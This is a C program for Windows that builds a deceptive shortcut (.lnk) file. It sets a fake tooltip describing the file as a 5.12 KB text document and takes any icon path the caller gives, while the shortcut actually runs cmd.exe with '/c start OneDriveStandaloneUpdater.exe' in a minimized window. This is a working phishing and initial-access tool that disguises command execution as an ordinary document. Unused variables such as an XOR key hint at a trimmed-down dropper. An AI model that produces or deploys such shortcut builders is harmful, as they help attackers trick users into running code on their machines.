#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "Ole32.lib")

#define HasName 0x00000004
#define HasArguments 0x00000020
#define HasIconLocation 0x00000040
#define IsUnicode 0x00000080
#define HasExpString 0x00000200
#define PreferEnvironmentPath 0x02000000

struct ShellLinkHeaderStruct
{
	DWORD dwHeaderSize;
	CLSID LinkCLSID;
	DWORD dwLinkFlags;
	DWORD dwFileAttributes;
	FILETIME CreationTime;
	FILETIME AccessTime;
	FILETIME WriteTime;
	DWORD dwFileSize;
	DWORD dwIconIndex;
	DWORD dwShowCommand;
	WORD wHotKey;
	WORD wReserved1;
	DWORD dwReserved2;
	DWORD dwReserved3;
};

struct EnvironmentVariableDataBlockStruct
{
	DWORD dwBlockSize;
	DWORD dwBlockSignature;
	char szTargetAnsi[MAX_PATH];
	wchar_t wszTargetUnicode[MAX_PATH];
};

DWORD CreateLinkFile(char *pOutputLinkPath, char *pLinkIconPath, char *pLinkDescription)
{
	HANDLE hLinkFile = NULL;
	HANDLE hExeFile = NULL;
	ShellLinkHeaderStruct ShellLinkHeader;
	EnvironmentVariableDataBlockStruct EnvironmentVariableDataBlock;
	DWORD dwBytesWritten = 0;
	WORD wLinkDescriptionLength = 0;
	wchar_t wszLinkDescription[512];
	WORD wCommandLineArgumentsLength = 0;
	wchar_t wszCommandLineArguments[8192];
	WORD wIconLocationLength = 0;
	wchar_t wszIconLocation[512];
	BYTE bExeDataBuffer[1024];
	DWORD dwBytesRead = 0;
	DWORD dwEndOfLinkPosition = 0;
	DWORD dwCommandLineArgsStartPosition = 0;
	wchar_t *pCmdLinePtr = NULL;
	wchar_t wszOverwriteSkipBytesValue[16];
	wchar_t wszOverwriteSearchLnkFileSizeValue[16];
	BYTE bXorEncryptValue = 0;
	DWORD dwTotalFileSize = 0;

	// set xor encrypt value
	bXorEncryptValue = 0x77;

	// create link file
	hLinkFile = CreateFile(pOutputLinkPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hLinkFile == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to create output file\n");
		return 1;
	}

	// initialise link header
	memset((void*)&ShellLinkHeader, 0, sizeof(ShellLinkHeader));
	ShellLinkHeader.dwHeaderSize = sizeof(ShellLinkHeader);
	CLSIDFromString(L"{00021401-0000-0000-C000-000000000046}", &ShellLinkHeader.LinkCLSID);
	ShellLinkHeader.dwLinkFlags = HasArguments | HasExpString | PreferEnvironmentPath | IsUnicode | HasName | HasIconLocation;
	ShellLinkHeader.dwFileAttributes = 0;
	ShellLinkHeader.CreationTime.dwHighDateTime = 0;
	ShellLinkHeader.CreationTime.dwLowDateTime = 0;
	ShellLinkHeader.AccessTime.dwHighDateTime = 0;
	ShellLinkHeader.AccessTime.dwLowDateTime = 0;
	ShellLinkHeader.WriteTime.dwHighDateTime = 0;
	ShellLinkHeader.WriteTime.dwLowDateTime = 0;
	ShellLinkHeader.dwFileSize = 0;
	ShellLinkHeader.dwIconIndex = 0;
	ShellLinkHeader.dwShowCommand = SW_SHOWMINNOACTIVE;
	ShellLinkHeader.wHotKey = 0;

	// write ShellLinkHeader
	if(WriteFile(hLinkFile, (void*)&ShellLinkHeader, sizeof(ShellLinkHeader), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// set link description
	memset(wszLinkDescription, 0, sizeof(wszLinkDescription));
	mbstowcs(wszLinkDescription, pLinkDescription, (sizeof(wszLinkDescription) / sizeof(wchar_t)) - 1);
	wLinkDescriptionLength = (WORD)wcslen(wszLinkDescription);

	// write LinkDescriptionLength
	if(WriteFile(hLinkFile, (void*)&wLinkDescriptionLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// write LinkDescription
	if(WriteFile(hLinkFile, (void*)wszLinkDescription, wLinkDescriptionLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// set target command-line
	memset(wszCommandLineArguments, 0, sizeof(wszCommandLineArguments));
	_snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, L"/c start OneDriveStandaloneUpdater.exe");
	wCommandLineArgumentsLength = (WORD)wcslen(wszCommandLineArguments);

	// write CommandLineArgumentsLength
	if(WriteFile(hLinkFile, (void*)&wCommandLineArgumentsLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// store start of command-line arguments position
	dwCommandLineArgsStartPosition = GetFileSize(hLinkFile, NULL);

	// write CommandLineArguments
	if(WriteFile(hLinkFile, (void*)wszCommandLineArguments, wCommandLineArgumentsLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// set link icon path
	memset(wszIconLocation, 0, sizeof(wszIconLocation));
	mbstowcs(wszIconLocation, pLinkIconPath, (sizeof(wszIconLocation) / sizeof(wchar_t)) - 1);
	wIconLocationLength = (WORD)wcslen(wszIconLocation);

	// write IconLocationLength
	if(WriteFile(hLinkFile, (void*)&wIconLocationLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// write IconLocation
	if(WriteFile(hLinkFile, (void*)wszIconLocation, wIconLocationLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// initialise environment variable data block
	memset((void*)&EnvironmentVariableDataBlock, 0, sizeof(EnvironmentVariableDataBlock));
	EnvironmentVariableDataBlock.dwBlockSize = sizeof(EnvironmentVariableDataBlock);
	EnvironmentVariableDataBlock.dwBlockSignature = 0xA0000001;
	strncpy(EnvironmentVariableDataBlock.szTargetAnsi, "%windir%\\system32\\cmd.exe", sizeof(EnvironmentVariableDataBlock.szTargetAnsi) - 1);
	mbstowcs(EnvironmentVariableDataBlock.wszTargetUnicode, EnvironmentVariableDataBlock.szTargetAnsi, (sizeof(EnvironmentVariableDataBlock.wszTargetUnicode) / sizeof(wchar_t)) - 1);

	// write EnvironmentVariableDataBlock
	if(WriteFile(hLinkFile, (void*)&EnvironmentVariableDataBlock, sizeof(EnvironmentVariableDataBlock), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// close output file handle
	CloseHandle(hLinkFile);

	return 0;
}

int main(int argc, char *argv[])
{
	char *pOutputLinkPath = NULL;
	char *pIconPath = NULL;

	if(argc != 3)
	{
		printf("\n[-] Usage: %s <LNK output path> <icon path>\n\n", argv[0]);

		return 1;
	}

	// get params
	pOutputLinkPath = argv[1];
	pIconPath = argv[2];

	// create a link file
	if(CreateLinkFile(pOutputLinkPath, pIconPath, "Type: Text Document\nSize: 5.12 KB\nDate modified: 01/08/2022 16:20") != 0)
	{
		printf("Error\n");

		return 1;
	}

	printf("Finished\n");

	return 0;
}